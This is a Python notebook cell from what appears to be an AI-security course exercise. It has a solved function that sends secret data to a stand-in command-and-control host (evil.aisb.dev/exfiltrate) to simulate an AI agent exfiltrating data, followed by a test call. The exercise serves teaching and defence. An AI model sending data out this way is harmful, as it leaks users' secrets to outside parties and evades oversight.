# %%
import base64
import time

from typing import Optional, Dict, Any
from unittest.mock import patch, MagicMock
import requests


def make_evil_request(secret_data: str) -> Optional[str]:
    """
    Send a GET request to evil.aisb.dev with secret data.

    This simulates an AI agent attempting to communicate with an external C2 server.
    The secret data is sent as a query parameter.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails or throws
    """
    # TODO: Implement the function to:
    #   1. Make a GET request to http://evil.aisb.dev/exfiltrate?data=secret_data
    #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
    #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
    #   2. Return the response text if successful (status 200), None otherwise
    try:
        url = "http://evil.aisb.dev/exfiltrate"
        result = requests.get(url, params={"data": secret_data}, timeout=5)
        if result.status_code == 200:
            return result.text
        else:
            return None
    except requests.exceptions.ConnectionError:
        return None


# %%
from w1d2_test import test_make_evil_request

test_make_evil_request(make_evil_request)

exfiltrate_data = make_evil_request
# %%
